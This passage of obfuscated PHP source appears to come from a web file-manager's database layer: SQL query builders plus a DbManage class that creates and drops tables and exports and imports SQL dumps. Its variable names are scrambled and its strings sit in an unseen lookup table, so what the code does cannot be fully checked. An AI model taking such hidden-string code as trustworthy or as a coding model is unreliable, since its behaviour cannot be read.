$¸ÈäçÕ = implode($İšäó[50], $¿œœúäÁ); } return !empty($¸ÈäçÕ) ? $İšäó[1028] . $¸ÈäçÕ : $İšäó[12]; } protected function parseGroup($¢ÃÅÃÔ÷) { $óıöØŞï =& $_SERVER[Ãìšã«™]; return !empty($¢ÃÅÃÔ÷) ? $óıöØŞï[1029] . $¢ÃÅÃÔ÷ : $óıöØŞï[12]; } protected function parseHaving($çãöÏ”Å) { $÷ø¢®ƒ¦ =& $_SERVER[Ãìšã«™]; return !empty($çãöÏ”Å) ? $÷ø¢®ƒ¦[1030] . $çãöÏ”Å : $÷ø¢®ƒ¦[12]; } protected function parseComment($áŠğì§Ô) { $¯ÔïÛìş =& $_SERVER[Ãìšã«™]; return !empty($áŠğì§Ô) ? $¯ÔïÛìş[1031] . $áŠğì§Ô . $¯ÔïÛìş[1032] : $¯ÔïÛìş[12]; } protected function parseDistinct($¾İàĞÕ¢) { $ñÀÊú =& $_SERVER[Ãìšã«™]; return !empty($¾İàĞÕ¢) ? $ñÀÊú[1033] : $ñÀÊú[12]; } protected function parseUnion($ô÷Ş®ò¿) { $¦õšÏ– =& $_SERVER[Ãìšã«™]; if (empty($ô÷Ş®ò¿)) { return $¦õšÏ–[12]; } if (isset($ô÷Ş®ò¿[$¦õšÏ–[343]])) { $·Ä‘›ØË = $¦õšÏ–[1034]; unset($ô÷Ş®ò¿[$¦õšÏ–[343]]); } else { $·Ä‘›ØË = $¦õšÏ–[1035]; } foreach ($ô÷Ş®ò¿ as $É¦Ç¬Ü¢) { $ÆèèéÆ®[] = $·Ä‘›ØË . (is_array($É¦Ç¬Ü¢) ? $this->buildSelectSql($É¦Ç¬Ü¢) : $É¦Ç¬Ü¢); } return implode($¦õšÏ–[53], $ÆèèéÆ®); } public function insert($áÉµ¥øÈ, $°âÊ¾•Õ = array(), $ŞÛË‘Êİ = false) { $×Ç©ÉÑ¯ =& $_SERVER[Ãìšã«™]; $”ñ©¹å‘ = $Š‡°å¸ı = array(); $this->model = $°âÊ¾•Õ[$×Ç©ÉÑ¯[276]]; foreach ($áÉµ¥øÈ as $•ÓÚ³óŸ => $×¢¼®£š) { if (is_array($×¢¼®£š) && $×Ç©ÉÑ¯[292] == $×¢¼®£š[0]) { $Š‡°å¸ı[] = $this->parseKey($•ÓÚ³óŸ); $”ñ©¹å‘[] = $×¢¼®£š[1]; } elseif (is_scalar($×¢¼®£š) || is_null($×¢¼®£š)) { $Š‡°å¸ı[] = $this->parseKey($•ÓÚ³óŸ); $”ñ©¹å‘[] = $this->parseValue($×¢¼®£š); } } $îÅÉåìª = ($ŞÛË‘Êİ ? $×Ç©ÉÑ¯[903] : $×Ç©ÉÑ¯[904]) . $×Ç©ÉÑ¯[905] . $this->parseTable($°âÊ¾•Õ[$×Ç©ÉÑ¯[274]]) . $×Ç©ÉÑ¯[899] . implode($×Ç©ÉÑ¯[50], $Š‡°å¸ı) . $×Ç©ÉÑ¯[900] . implode($×Ç©ÉÑ¯[50], $”ñ©¹å‘) . $×Ç©ÉÑ¯[901]; $îÅÉåìª .= $this->parseLock(isset($°âÊ¾•Õ[$×Ç©ÉÑ¯[844]]) ? $°âÊ¾•Õ[$×Ç©ÉÑ¯[844]] : !1); $îÅÉåìª .= $this->parseComment(!empty($°âÊ¾•Õ[$×Ç©ÉÑ¯[349]]) ? $°âÊ¾•Õ[$×Ç©ÉÑ¯[349]] : $×Ç©ÉÑ¯[12]); return $this->execute($îÅÉåìª, $this->parseBind(!empty($°âÊ¾•Õ[$×Ç©ÉÑ¯[280]]) ? $°âÊ¾•Õ[$×Ç©ÉÑ¯[280]] : array())); } public function selectInsert($ÅÕ¡¢Èú, $·®ˆä×İ, $Û‘ÄŒ– = array()) { $ŸîŒ ­ =& $_SERVER[Ãìšã«™]; $this->model = $Û‘ÄŒ–[$ŸîŒ ­[276]]; if (is_string($ÅÕ¡¢Èú)) { $ÅÕ¡¢Èú = explode($ŸîŒ ­[50], $ÅÕ¡¢Èú); } array_walk($ÅÕ¡¢Èú, array($this, $ŸîŒ ­[902])); $½¾ëÍ°ç = $ŸîŒ ­[1036] . $this->parseTable($·®ˆä×İ) . $ŸîŒ ­[899] . implode($ŸîŒ ­[50], $ÅÕ¡¢Èú) . $ŸîŒ ­[1014]; $½¾ëÍ°ç .= $this->buildSelectSql($Û‘ÄŒ–); return $this->execute($½¾ëÍ°ç, $this->parseBind(!empty($Û‘ÄŒ–[$ŸîŒ ­[280]]) ? $Û‘ÄŒ–[$ŸîŒ ­[280]] : array())); } public function update($¥½Í¤–, $ñ‰êÕ¨) { $¤Ïó¯ª§ =& $_SERVER[Ãìšã«™]; $this->model = $ñ‰êÕ¨[$¤Ïó¯ª§[276]]; $‰ÃÜ…Ã = $¤Ïó¯ª§[1037] . $this->parseTable($ñ‰êÕ¨[$¤Ïó¯ª§[274]]) . $this->parseSet($¥½Í¤–) . $this->parseWhere(!empty($ñ‰êÕ¨[$¤Ïó¯ª§[270]]) ? $ñ‰êÕ¨[$¤Ïó¯ª§[270]] : $¤Ïó¯ª§[12]) . $this->parseOrder(!empty($ñ‰êÕ¨[$¤Ïó¯ª§[360]]) ? $ñ‰êÕ¨[$¤Ïó¯ª§[360]] : $¤Ïó¯ª§[12]) . $this->parseLimit(!empty($ñ‰êÕ¨[$¤Ïó¯ª§[287]]) ? $ñ‰êÕ¨[$¤Ïó¯ª§[287]] : $¤Ïó¯ª§[12]) . $this->parseLock(isset($ñ‰êÕ¨[$¤Ïó¯ª§[844]]) ? $ñ‰êÕ¨[$¤Ïó¯ª§[844]] : !1) . $this->parseComment(!empty($ñ‰êÕ¨[$¤Ïó¯ª§[349]]) ? $ñ‰êÕ¨[$¤Ïó¯ª§[349]] : $¤Ïó¯ª§[12]); return $this->execute($‰ÃÜ…Ã, $this->parseBind(!empty($ñ‰êÕ¨[$¤Ïó¯ª§[280]]) ? $ñ‰êÕ¨[$¤Ïó¯ª§[280]] : array())); } public function delete($Š¾³Ññ = array()) { $Æ«ğêÚö =& $_SERVER[Ãìšã«™]; $this->model = $Š¾³Ññ[$Æ«ğêÚö[276]]; $Í»½½Ëš = $Æ«ğêÚö[1038] . $this->parseTable($Š¾³Ññ[$Æ«ğêÚö[274]]) . $this->parseWhere(!empty($Š¾³Ññ[$Æ«ğêÚö[270]]) ? $Š¾³Ññ[$Æ«ğêÚö[270]] : $Æ«ğêÚö[12]) . $this->parseOrder(!empty($Š¾³Ññ[$Æ«ğêÚö[360]]) ? $Š¾³Ññ[$Æ«ğêÚö[360]] : $Æ«ğêÚö[12]) . $this->parseLimit(!empty($Š¾³Ññ[$Æ«ğêÚö[287]]) ? $Š¾³Ññ[$Æ«ğêÚö[287]] : $Æ«ğêÚö[12]) . $this->parseLock(isset($Š¾³Ññ[$Æ«ğêÚö[844]]) ? $Š¾³Ññ[$Æ«ğêÚö[844]] : !1) . $this->parseComment(!empty($Š¾³Ññ[$Æ«ğêÚö[349]]) ? $Š¾³Ññ[$Æ«ğêÚö[349]] : $Æ«ğêÚö[12]); return $this->execute($Í»½½Ëš, $this->parseBind(!empty($Š¾³Ññ[$Æ«ğêÚö[280]]) ? $Š¾³Ññ[$Æ«ğêÚö[280]] : array())); } public function select($øÖ›ÓÎ = array()) { $à‘¯¶ëª =& $_SERVER[Ãìšã«™]; $this->model = $øÖ›ÓÎ[$à‘¯¶ëª[276]]; $»Ùæüˆ’ = $this->buildSelectSql($øÖ›ÓÎ); $–öí©¦ = isset($øÖ›ÓÎ[$à‘¯¶ëª[344]]) ? $øÖ›ÓÎ[$à‘¯¶ëª[344]] : !1; if ($–öí©¦) { $Şñé¥°° = is_string($–öí©¦[$à‘¯¶ëª[95]]) ? $–öí©¦[$à‘¯¶ëª[95]] : $à‘¯¶ëª[1039] . md5($»Ùæüˆ’); $¶ÏĞ¬†¨ = think_cache($Şñé¥°°, $à‘¯¶ëª[12], $–öí©¦); if (!1 !== $¶ÏĞ¬†¨) { return $¶ÏĞ¬†¨; } } $òİéØÓã = $this->query($»Ùæüˆ’, $this->parseBind(!empty($øÖ›ÓÎ[$à‘¯¶ëª[280]]) ? $øÖ›ÓÎ[$à‘¯¶ëª[280]] : array())); if ($–öí©¦ && !1 !== $òİéØÓã) { think_cache($Şñé¥°°, $òİéØÓã, $–öí©¦); } return $òİéØÓã; } public function buildSelectSql($Ší˜ÈÍ = array()) { $ÑãøÈ’Ø =& $_SERVER[Ãìšã«™]; if (isset($Ší˜ÈÍ[$ÑãøÈ’Ø[348]])) { if (strpos($Ší˜ÈÍ[$ÑãøÈ’Ø[348]], $ÑãøÈ’Ø[50])) { list($ªš²‹¤, $ƒ¸¹›½Ï) = explode($ÑãøÈ’Ø[50], $Ší˜ÈÍ[$ÑãøÈ’Ø[348]]); } else { $ªš²‹¤ = $Ší˜ÈÍ[$ÑãøÈ’Ø[348]]; } $ªš²‹¤ = $ªš²‹¤ ? $ªš²‹¤ : 1; $ƒ¸¹›½Ï = isset($ƒ¸¹›½Ï) ? $ƒ¸¹›½Ï : (is_numeric($Ší˜ÈÍ[$ÑãøÈ’Ø[287]]) ? $Ší˜ÈÍ[$ÑãøÈ’Ø[287]] : 20); $ ÜÄ¦È¶ = $ƒ¸¹›½Ï * ((int) $ªš²‹¤ - 1); $Ší˜ÈÍ[$ÑãøÈ’Ø[287]] = $ ÜÄ¦È¶ . $ÑãøÈ’Ø[50] . $ƒ¸¹›½Ï; } if (think_config($ÑãøÈ’Ø[1040])) { $ÂşÈÊîÕ = $ÑãøÈ’Ø[1041] . md5(serialize($Ší˜ÈÍ)); $éçşãÛ¯ = think_cache($ÂşÈÊîÕ); if ($éçşãÛ¯) { return $éçşãÛ¯; } } $¼«õÕÊĞ = $this->parseSql($this->selectSql, $Ší˜ÈÍ); $¼«õÕÊĞ .= $this->parseLock(isset($Ší˜ÈÍ[$ÑãøÈ’Ø[844]]) ? $Ší˜ÈÍ[$ÑãøÈ’Ø[844]] : !1); if (isset($ÂşÈÊîÕ)) { think_cache($ÂşÈÊîÕ, $¼«õÕÊĞ); } return $¼«õÕÊĞ; } public function parseSql($ËÛÉéçü, $æÉáì¼† = array()) { $È”™§¥Ç =& $_SERVER[Ãìšã«™]; $ËÛÉéçü = str_replace(array($È”™§¥Ç[1042], $È”™§¥Ç[1043], $È”™§¥Ç[1044], $È”™§¥Ç[1045], $È”™§¥Ç[1046], $È”™§¥Ç[1047], $È”™§¥Ç[1048], $È”™§¥Ç[1049], $È”™§¥Ç[1050], $È”™§¥Ç[1051], $È”™§¥Ç[1052]), array($this->parseTable("{$æÉáì¼†[$È”™§¥Ç[274]]}"), $this->parseDistinct(isset($æÉáì¼†[$È”™§¥Ç[1053]]) ? $æÉáì¼†[$È”™§¥Ç[1053]] : !1), $this->parseField(!empty($æÉáì¼†[$È”™§¥Ç[268]]) ? $æÉáì¼†[$È”™§¥Ç[268]] : $È”™§¥Ç[181]), $this->parseJoin(!empty($æÉáì¼†[$È”™§¥Ç[277]]) ? $æÉáì¼†[$È”™§¥Ç[277]] : $È”™§¥Ç[12]), $this->parseWhere(!empty($æÉáì¼†[$È”™§¥Ç[270]]) ? $æÉáì¼†[$È”™§¥Ç[270]] : $È”™§¥Ç[12]), $this->parseGroup(!empty($æÉáì¼†[$È”™§¥Ç[515]]) ? $æÉáì¼†[$È”™§¥Ç[515]] : $È”™§¥Ç[12]), $this->parseHaving(!empty($æÉáì¼†[$È”™§¥Ç[1054]]) ? $æÉáì¼†[$È”™§¥Ç[1054]] : $È”™§¥Ç[12]), $this->parseOrder(!empty($æÉáì¼†[$È”™§¥Ç[360]]) ? $æÉáì¼†[$È”™§¥Ç[360]] : $È”™§¥Ç[12]), $this->parseLimit(!empty($æÉáì¼†[$È”™§¥Ç[287]]) ? $æÉáì¼†[$È”™§¥Ç[287]] : $È”™§¥Ç[12]), $this->parseUnion(!empty($æÉáì¼†[$È”™§¥Ç[342]]) ? $æÉáì¼†[$È”™§¥Ç[342]] : $È”™§¥Ç[12]), $this->parseComment(!empty($æÉáì¼†[$È”™§¥Ç[349]]) ? $æÉáì¼†[$È”™§¥Ç[349]] : $È”™§¥Ç[12])), $ËÛÉéçü); return $ËÛÉéçü; } public function getLastSql($Ö¢´óÄ = '') { return $Ö¢´óÄ ? $this->modelSql[$Ö¢´óÄ] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($´áçÛÄ) { return addslashes($´áçÛÄ); } public function setModel($‚êÑÛå) { $this->model = $‚êÑÛå; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } class DbManage { function __construct($®Çá¸«¸ = array()) { $¿ßº‚Éö =& $_SERVER[Ãìšã«™]; if (empty($®Çá¸«¸)) { $®Çá¸«¸ = $GLOBALS[$¿ßº‚Éö[6]][$¿ßº‚Éö[21]]; } $this->database = $®Çá¸«¸; } public function model($ŞÁÑô¸Ë = '') { return new ModelBase($ŞÁÑô¸Ë, $_SERVER[Ãìšã«™][12], $this->database); } public function db($¸é†äƒ  = false) { $º Š…Åê =& $_SERVER[Ãìšã«™]; $œÍ¯ùÃğ = array_change_key_case($this->database); if ($this->dbType() == $º Š…Åê[13] || !$¸é†äƒ ) { return $this->model()->db(); } $úƒ§Î÷³ = $œÍ¯ùÃğ[$º Š…Åê[968]]; $œÍ¯ùÃğ[$º Š…Åê[968]] = $º Š…Åê[12]; if ($œÍ¯ùÃğ[$º Š…Åê[963]] == $º Š…Åê[960]) { $†Ò¸ï = $œÍ¯ùÃğ[$º Š…Åê[969]]; $œÍ¯ùÃğ[$º Š…Åê[969]] = substr($†Ò¸ï, 0, strrpos($†Ò¸ï, $º Š…Åê[1055])); } $this->database = $œÍ¯ùÃğ; $Ò®ÊÖ§ş = $this->model()->db(); try { $¹ô²Ğä¶ = $Ò®ÊÖ§ş->execute("\x73\150\157\167\x20\x64\141\x74\x61\142\x61\163\x65\x73\40\154\x69\x6b\145\40\47{$úƒ§Î÷³}\x27"); } catch (Exception $¶–•ÙÚ) { } if (!$¹ô²Ğä¶) { $Ò®ÊÖ§ş->execute("\x63\x72\145\x61\x74\x65\40\144\x61\164\x61\x62\x61\163\145\x20\x60{$úƒ§Î÷³}\140"); } $œÍ¯ùÃğ[$º Š…Åê[968]] = $úƒ§Î÷³; if ($œÍ¯ùÃğ[$º Š…Åê[963]] == $º Š…Åê[960]) { $œÍ¯ùÃğ[$º Š…Åê[969]] .= $º Š…Åê[1055] . $úƒ§Î÷³; } $this->database = $œÍ¯ùÃğ; $Ò®ÊÖ§ş->execute("\165\x73\145\40\140{$úƒ§Î÷³}\140"); return $Ò®ÊÖ§ş; } public function createTable($ÒÑÌôÖ³, &$­ø„Ò¤Õ) { $ŠŸ‡úŠ =& $_SERVER[Ãìšã«™]; if (!IO::exist($ÒÑÌôÖ³)) { ActionCall($ŠŸ‡úŠ[1056], !0, 0); show_json(LNG($ŠŸ‡úŠ[1057]), !1); } $ä††›×Ş = $this->model()->db(); $ù—³ÎÑÁ = sqlSplit(IO::getContent($ÒÑÌôÖ³)); foreach ($ù—³ÎÑÁ as $ÆÜÜ«) { $†²¤÷Ş = stripos($ÆÜÜ«, $ŠŸ‡úŠ[1058]) === 0; if ($†²¤÷Ş) { $­ø„Ò¤Õ->task[$ŠŸ‡úŠ[787]] += 1; } $ä††›×Ş->execute($ÆÜÜ«); if ($†²¤÷Ş) { preg_match($ŠŸ‡úŠ[1059], $ÆÜÜ«, $­…êÃÈä); $­ø„Ò¤Õ->task[$ŠŸ‡úŠ[1060]] = $­…êÃÈä[1]; $­ø„Ò¤Õ->update(1); } } } public function insertTable($³“– £, &$ˆŒÃõ‚›) { $¨¹¤’¬ç =& $_SERVER[Ãìšã«™]; $–¦“Ù¯æ = $this->model()->db(); $š¿ ¢ìâ = $ã­½šÆ‰ ? array($ã­½šÆ‰) : $–¦“Ù¯æ->getTables(); foreach ($³“– £ as $âæÌ¢¹„) { $ã­½šÆ‰ = basename($âæÌ¢¹„, $¨¹¤’¬ç[789]); if (!in_array($ã­½šÆ‰, $š¿ ¢ìâ)) { continue; } $ˆŒÃõ‚›->task[$¨¹¤’¬ç[1060]] = $ã­½šÆ‰; if (get_filesize($âæÌ¢¹„) == 0) { continue; } $¹›Â»Ö‚ = $this->sqlToDb($âæÌ¢¹„, $ˆŒÃõ‚›); if (!$¹›Â»Ö‚) { ActionCall($¨¹¤’¬ç[1056], !0, 0); show_json(LNG($¨¹¤’¬ç[1061]) . "\x5b{$ã­½šÆ‰}\x5d", !1); } } } public function sqlFromDb($«ìş˜·ê, $ŞÆËÖñá, &$»âÛ¬«§, $Œºº¢¥È = '') { if ($»âÛ¬«§) { $»âÛ¬«§->task[$_SERVER[Ãìšã«™][1060]] = $«ìş˜·ê; } $âÜø€’« = $this->model($«ìş˜·ê); $ê¾û†¿ = 0; $ ĞÃÛ˜ü = 0; $ƒÎ·Á—ï = 10000; $ïæ“€öË = fopen($ŞÆËÖñá, $_SERVER[Ãìšã«™][1062]); $°ºåÈç = $âÜø€’«->getPk(); $ıÂªô‹ = $âÜø€’«->getDbFields(); $Ø¸‘Ã²Ù = $_SERVER[Ãìšã«™][12]; if ($GLOBALS[$_SERVER[Ãìšã«™][788]] && in_array($«ìş˜·ê, array($_SERVER[Ãìšã«™][1063], $_SERVER[Ãìšã«™][1064]))) { $Ø¸‘Ã²Ù = $«ìş˜·ê; } do { $•òÊöÅË = array($°ºåÈç => array($_SERVER[Ãìšã«™][1010], $ ĞÃÛ˜ü)); $Áúú‹È¨ = $âÜø€’«->where($•òÊöÅË)->field($ıÂªô‹)->order($°ºåÈç . $_SERVER[Ãìšã«™][1065])->limit($ƒÎ·Á—ï)->select(); $Áúú‹È¨ = !empty($Áúú‹È¨) ? $Áúú‹È¨ : array(); if (!($œšÍ˜·‚ = count($Áúú‹È¨))) { break; } $ğ£–¾’Õ = end($Áúú‹È¨); $ ĞÃÛ˜ü = $ğ£–¾’Õ[$°ºåÈç]; $Ÿ­ÈÉŠø = array(); foreach ($Áúú‹È¨ as $œæòŸüŞ) { if ($Ø¸‘Ã²Ù) { if ($«ìş˜·ê == $_SERVER[Ãìšã«™][1063]) { if ($œæòŸüŞ[$_SERVER[Ãìšã«™][33]] == $_SERVER[Ãìšã«™][1066]) { $ŞÒñìÛ = json_decode($œæòŸüŞ[$_SERVER[Ãìšã«™][369]], !0); if ($ŞÒñìÛ[$_SERVER[Ãìšã«™][32]] == $GLOBALS[$_SERVER[Ãìšã«™][788]] && $ŞÒñìÛ[$_SERVER[Ãìšã«™][751]] != 1) { continue; } } } else { if ($œæòŸüŞ[$_SERVER[Ãìšã«™][33]] == $_SERVER[Ãìšã«™][1067] && $œæòŸüŞ[$_SERVER[Ãìšã«™][95]] == $_SERVER[Ãìšã«™][780]) { continue; } } } if ($Œºº¢¥È) { $œæòŸüŞ[$_SERVER[Ãìšã«™][78]] = "\173\x69\157\x3a{$Œºº¢¥È}\x7d" . substr($œæòŸüŞ[$_SERVER[Ãìšã«™][78]], strlen("\x7b\x69\157\72{$œæòŸüŞ[$_SERVER[Ãìšã«™][818]]}\175")); $œæòŸüŞ[$_SERVER[Ãìšã«™][818]] = $Œºº¢¥È; } $Ÿ­ÈÉŠø[] = $_SERVER[Ãìšã«™][1068] . $this->sqlEncode($œæòŸüŞ) . $_SERVER[Ãìšã«™][1069]; } $Ê—£ùß = "\111\116\x53\105\x52\x54\x20\x49\x4e\x54\117\40\140{$«ìş˜·ê}\x60\x20\x28\x60" . implode($_SERVER[Ãìšã«™][1070], $ıÂªô‹) . $_SERVER[Ãìšã«™][1071]; fwrite($ïæ“€öË, $Ê—£ùß . implode($_SERVER[Ãìšã«™][1072], $Ÿ­ÈÉŠø) . $_SERVER[Ãìšã«™][71] . PHP_EOL); $ê¾û†¿ += $œšÍ˜·‚; if ($»âÛ¬«§) { $»âÛ¬«§->update($œšÍ˜·‚); } } while ($ƒÎ·Á—ï == $œšÍ˜·‚); fclose($ïæ“€öË); return $ê¾û†¿; } public function sqlToDb($‡ù‘¥»¬, &$“çëÌÄŞ) { $€ÇÀíøº =& $_SERVER[Ãìšã«™]; $€Ê©æôï = $this->model()->db(); $ÛŸ¨¦® = @fopen($‡ù‘¥»¬, $€ÇÀíøº[1073]); if (!$ÛŸ¨¦®) { return !1; } $ÕšÚ¦Ö = 0; $È¼éÌ¤  = $€ÇÀíøº[12]; $ÖŞ§¦ = array(); $Ìˆ½Öë  = $this->dbType(); $Õ§›òÛ = $Ìˆ½Öë  == $€ÇÀíøº[13] ? 500 : 2000; $²«ÂÖÁ» = basename($‡ù‘¥»¬, $€ÇÀíøº[789]); $ÖğÏè®é = 0; $Ù¸‰ø×ù = 4194304 - 104858; $®³•ğÎÉ = 1000000 - 104858; while (!feof($ÛŸ¨¦®)) { $ÔùÒ¿Ü = trim(fgets($ÛŸ¨¦®)); if (!$ÔùÒ¿Ü) { continue; } $‹ÒÉåÉœ = $this->sqlDecode($ÔùÒ¿Ü, $Ìˆ½Öë , $²«ÂÖÁ»); if (stripos($‹ÒÉåÉœ, $€ÇÀíøº[350]) === 0) { if (!$È¼éÌ¤ ) { $È¼éÌ¤  = $‹ÒÉåÉœ . $€ÇÀíøº[53]; } continue; } if ($“çëÌÄŞ) { $“çëÌÄŞ->task[$€ÇÀíøº[787]] += 1; } $ÕšÚ¦Ö++; $ÖŞ§¦[] = rtrim(rtrim(trim($‹ÒÉåÉœ), $€ÇÀíøº[50]), $€ÇÀíøº[71]); $ÛÚšş = null; $ú’®¹øß = strlen($‹ÒÉåÉœ); $ÖğÏè®é += $ú’®¹øß; if ($ÖğÏè®é >= ($Õ§›òÛ == 500 ? $®³•ğÎÉ : $Ù¸‰ø×ù)) { $ÛÚšş = array_pop($ÖŞ§¦); if ($ÕšÚ¦Ö > 1) { $ÕšÚ¦Ö--; } } if ($ÕšÚ¦Ö >= $Õ§›òÛ || $ÛÚšş) { $‹ÒÉåÉœ = $È¼éÌ¤  . implode($€ÇÀíøº[50], $ÖŞ§¦); if (!$€Ê©æôï->execute($‹ÒÉåÉœ)) { return !1; } if ($“çëÌÄŞ) { $“çëÌÄŞ->update($ÕšÚ¦Ö); } $ÖŞ§¦ = array(); $ÕšÚ¦Ö = 0; $ÖğÏè®é = 0; if ($ÛÚšş) { $ÖŞ§¦ = array($ÛÚšş); $ÕšÚ¦Ö = 1; $ÖğÏè®é = $ú’®¹øß; } } } fclose($ÛŸ¨¦®); if (!empty($ÖŞ§¦)) { $‹ÒÉåÉœ = $È¼éÌ¤  . implode($€ÇÀíøº[50], $ÖŞ§¦); if (!$€Ê©æôï->execute($‹ÒÉåÉœ)) { return !1; } if ($“çëÌÄŞ) { $“çëÌÄŞ->update($ÕšÚ¦Ö); } } return !0; } public function dropTable($ Øâı¬º = null) { $ƒÈ‹È‡° = $this->model()->db(); $¢Æ‚¥æ = $ Øâı¬º ? array($ Øâı¬º) : $ƒÈ‹È‡°->getTables(); if (!$¢Æ‚¥æ) { return; } foreach ($¢Æ‚¥æ as $ Øâı¬º) { if ($ Øâı¬º) { $ Øâı¬º = strtolower($ Øâı¬º); } else { continue; } $ƒÈ‹È‡°->execute("\144\162\157\x70\40\164\141\142\x6c\x65\x20\x69\146\40\145\x78\151\x73\164\x73\x20\x60{$ Øâı¬º}\140"); } } private function sqlEncode($¡Ã›Ìœ³) { $„ê†òèÄ =& $_SERVER[Ãìšã«™]; $ù²ã÷ª = array(); foreach ($¡Ã›Ìœ³ as $ê»ÆÓç) { if (is_array($ê»ÆÓç)) { $ê»ÆÓç = json_encode_force($ê»ÆÓç); } $ê»ÆÓç = addslashes($ê»ÆÓç); $ê»ÆÓç = str_replace(array($„ê†òèÄ[1074], $„ê†òèÄ[226]), array($„ê†òèÄ[1075], $„ê†òèÄ[1076]), $ê»ÆÓç); $ù²ã÷ª[] = str_replace($„ê†òèÄ[58], $„ê†òèÄ[1077], $ê»ÆÓç); } return $„ê†òèÄ[58] . implode($„ê†òèÄ[1078], $ù²ã÷ª) . $„ê†òèÄ[58]; } private function sqlDecode($áì²¢ß, $å×ğ¢€, $‚Ä¢‹¿ = '') { $ºè¯¬ôø =& $_SERVER[Ãìšã«™]; $áì²¢ß = str_replace(array($ºè¯¬ôø[1075], $ºè¯¬ôø[1076]), array($ºè¯¬ôø[1074], $ºè¯¬ôø[226]), $áì²¢ß); if ($å×ğ¢€ == $ºè¯¬ôø[13]) { return $‚Ä¢‹¿ != $ºè¯¬ôø[1079] ? stripslashes($áì²¢ß) : $áì²¢ß; } if ($‚Ä¢‹¿ == $ºè¯¬ôø[1079]) { $áì²¢ß = str_replace($ºè¯¬ôø[1080], $ºè¯¬ôø[117], stripslashes($áì²¢ß)); } return $áì²¢ß; } public function getSqlFile($÷´¹Úü¸ = '') { $êóÃ•—³ =& $_SERVER[Ãìšã«™]; $Ö›ì‡Ã‡ = $this->dbType(!0); $äŸĞ¿¹  = CONTROLLER_DIR . "\x69\156\163\164\141\x6c\x6c\57\x64\141\164\x61\x2f{$Ö›ì‡Ã‡}\x2e\x73\161\x6c"; $ÁÏÖ‹›ô = file_get_contents($äŸĞ¿¹ ); $‘¼ø»×Ù = $êóÃ•—³[1081] . ($Ö›ì‡Ã‡ == $êóÃ•—³[805] ? $êóÃ•—³[1082] : $êóÃ•—³[1083]) . $êóÃ•—³[1084]; preg_match_all($‘¼ø»×Ù, $ÁÏÖ‹›ô, $àò²ßšÒ); $É€¶©˜” = $àò²ßšÒ[1]; $Îòœ¹ºõ = $this->model()->db(); $ìÓß = $Îòœ¹ºõ->getTables(); $ ¿ûˆëË = TEMP_FILES . $êóÃ•—³[1085] . date($êóÃ•—³[752]) . $êóÃ•—³[8]; del_dir($ ¿ûˆëË); mk_dir($ ¿ûˆëË); $Ú‡—–¥ = $ ¿ûˆëË . $êóÃ•—³[1086]; $¯Âß³ÈÀ = $ ¿ûˆëË . $êóÃ•—³[1087]; $“”ßÜÊ¹ = $Ö›ì‡Ã‡ == $êóÃ•—³[13] ? $êóÃ•—³[805] : $êóÃ•—³[13]; IO::copy(CONTROLLER_DIR . "\x69\x6e\x73\x74\x61\154\154\57\x64\141\164\141\x2f{$“”ßÜÊ¹}\x2e\x73\161\x6c", $ ¿ûˆëË); @touch($ ¿ûˆëË . $Ö›ì‡Ã‡ . $êóÃ•—³[789]); $éŞ™°¿ = fopen($Ú‡—–¥, $êóÃ•—³[1062]); $˜à¶‹Ç³ = fopen($¯Âß³ÈÀ, $êóÃ•—³[1062]); if ($Ö›ì‡Ã‡ == $êóÃ•—³[13]) { $ìÓß = array_diff($ìÓß, array($êóÃ•—³[785], $êóÃ•—³[786])); $ÔÁá©°Ã = array($êóÃ•—³[1088], $êóÃ•—³[1089], $êóÃ•—³[1090]); fwrite($˜à¶‹Ç³, implode(PHP_EOL, $ÔÁá©°Ã) . PHP_EOL . PHP_EOL); foreach ($ìÓß as $Æ®Ôë³²) { $Û÷éŞ•° = $this->sqlFromSqlite($Æ®Ôë³²); if (!$Û÷éŞ•°[$êóÃ•—³[13]]) { continue; } fwrite($˜à¶‹Ç³, $Û÷éŞ•°[$êóÃ•—³[13]] . PHP_EOL . PHP_EOL); if (!in_array($Æ®Ôë³², $É€¶©˜”)) { fwrite($éŞ™°¿, $Û÷éŞ•°[$êóÃ•—³[805]] . PHP_EOL . PHP_EOL); } } } else { foreach ($ìÓß as $Æ®Ôë³²) { $Û÷éŞ•° = $this->sqlFromMysql($Æ®Ôë³²); if (!$Û÷éŞ•°[$êóÃ•—³[805]]) { continue; } fwrite($éŞ™°¿, $Û÷éŞ•°[$êóÃ•—³[805]] . PHP_EOL . PHP_EOL); if (!in_array($Æ®Ôë³², $É€¶©˜”)) { fwrite($˜à¶‹Ç³, $Û÷éŞ•°[$êóÃ•—³[13]] . PHP_EOL . PHP_EOL); } } } fclose($éŞ™°¿); fclose($˜à¶‹Ç³); $ÁÏÖ‹›ô = array($êóÃ•—³[805] => $Ú‡—–¥, $êóÃ•—³[13] => $¯Âß³ÈÀ); return $÷´¹Úü¸ ? $ÁÏÖ‹›ô[$÷´¹Úü¸] : $ÁÏÖ‹›ô; } public function dbType($º˜ÂûÑÚ = false) { $øÆúó™ø =& $_SERVER[Ãìšã«™]; $‰‹õşÓŒ = $º˜ÂûÑÚ ? $GLOBALS[$øÆúó™ø[6]][$øÆúó™ø[21]] : $this->database; $‰‹õşÓŒ = array_change_key_case($‰‹õşÓŒ); $£¹ÎÆÄ = $‰‹õşÓŒ[$øÆúó™ø[963]]; if ($£¹ÎÆÄ == $øÆúó™ø[960]) { $ÕéŠ†È½ = explode($øÆúó™ø[4], $‰‹õşÓŒ[$øÆúó™ø[969]]); $£¹ÎÆÄ = $ÕéŠ†È½[0]; } $Ôş‘è = array($øÆúó™ø[1091] => $øÆúó™ø[13], $øÆúó™ø[908] => $øÆúó™ø[805]); if (isset($Ôş‘è[$£¹ÎÆÄ])) { $£¹ÎÆÄ = $Ôş‘è[$£¹ÎÆÄ]; } return $£¹ÎÆÄ; } public function sqlFromMysql($ ÅÉ‡½°, $á€öò¬Ø = '') { $¤ì¥¢Š =& $_SERVER[Ãìšã«™]; $Ê®ÃœŒï = $this->model()->db(); $ßêƒ‡üê = $Ê®ÃœŒï->query($¤ì¥¢Š[1092] . $ ÅÉ‡½° . $¤ì¥¢Š[380]); if (!$ßêƒ‡üê || !$ßêƒ‡üê[0]) { return !1; } $„–Èç‚¶ = _get($ßêƒ‡üê[0], $¤ì¥¢Š[1093], $¤ì¥¢Š[12]); if (!$„–Èç‚¶) { return !1; } $æó»ŞØÁ = 